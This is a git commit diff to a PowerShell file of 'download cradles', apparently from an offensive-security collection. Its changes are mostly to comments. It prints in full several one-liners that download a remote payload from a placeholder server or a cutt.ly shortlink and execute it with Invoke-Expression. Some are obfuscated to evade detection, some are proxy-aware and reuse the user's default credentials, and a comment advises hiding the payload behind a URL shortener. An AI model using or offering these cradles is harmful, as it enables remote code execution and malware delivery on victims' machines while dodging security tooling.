9152e85a13764b3c5be1db322e79d6c991be3623
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-24 19:56:23 +0100

    Update Download_Cradles.ps1

--- Download_Cradles.ps1
+++ Download_Cradles.ps1
@@ -1,25 +1,23 @@
 # Not proxy aware download cradles, which can be executed in a Windows PowerShell (powershell.exe)  
-
-# Windows PowerShell default download cradle
+# Windows PowerShell default download cradle not proxy aware
 ps> IEX (New-Object Net.Webclient).downloadstring("http://server/payload.ps1")
 
-# Windows PowerShell lightly obfuscated Cradle 
+# Windows PowerShell lightly obfuscated Cradle not proxy aware
 ps> (New-Object Net.WebClient).DownloadString('http://server/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')
 
-# Windows PowerShell heavily obfuscated Cradle
+# Windows PowerShell heavily obfuscated Cradle not proxy aware
 ps> $ExecutionContext|ForEach{(GV _).Value.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|Where-Object{(GV _).Value.Name-ilike'*v*ip*'}).Name)((([Char[]][System.Net.WebClient]::New().DownloadData('http://server/payload.ps1'))-Join''))}
 
 
-
-# proxy aware download cradles
+# Proxy aware download cradles
 # Info: Because you are limited in length, you have to use a shortcut link to the raw link from your hosted payload on Github
 # For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github
 
-# Windows PowerShell default download cradle
+# Windows PowerShell default download cradle proxy aware
 ps> $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iEx $c.downloadstring("https://cutt.ly/syFzILH")
 
-# Windows PowerShell obfuscated cradle 
+# Windows PowerShell obfuscated cradle proxy aware
 ps> (New-Object Net.WebClient).DownloadString('https://cutt.ly/syFzILH')|.$ExecutionContext.(($ExecutionContext|Member)[6].Name).GetCmdlet($ExecutionContext.(($ExecutionContext|Member)[6].Name).(($ExecutionContext.(($ExecutionContext|Member)[6].Name)|Member|?{$_.Name-like'*man*Name'}).Name).Invoke('*ke-*pr*',1,$TRUE))
 
-# Windows PowerShell obfuscated cradle 
+# Windows PowerShell obfuscated cradle proxy aware
 ps> $c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`E`x $c.downloadstring("ht"+"tps://cutt.ly/syFzILH")
